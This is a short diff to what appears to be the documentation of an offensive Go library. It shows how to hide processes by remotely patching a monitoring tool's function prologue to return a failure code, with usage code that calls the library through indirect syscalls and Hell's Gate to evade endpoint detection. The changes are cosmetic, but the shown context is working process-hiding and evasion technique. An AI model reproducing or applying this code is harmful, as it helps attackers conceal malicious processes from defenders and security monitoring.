@@ -18,7 +18,7 @@ is loaded at the same virtual address in every process (shared KUSER_SHARED +
 ASLR randomised once per boot), so we resolve the target VA locally, open the
 target with `PROCESS_VM_WRITE | PROCESS_VM_OPERATION`, and patch the prologue:
 
-```
+```asm
 mov eax, 0xC0000002  ; B8 02 00 00 C0
 ret                   ; C3
 ```
@@ -72,7 +72,7 @@ func main() {
     }
 
     // With indirect syscalls:
-    caller, _ := wsyscall.New(wsyscall.MethodIndirect, wsyscall.WithHellsGate())
+    caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
     _ = hideprocess.PatchProcessMonitor(targetPID, caller)
 }
 ```
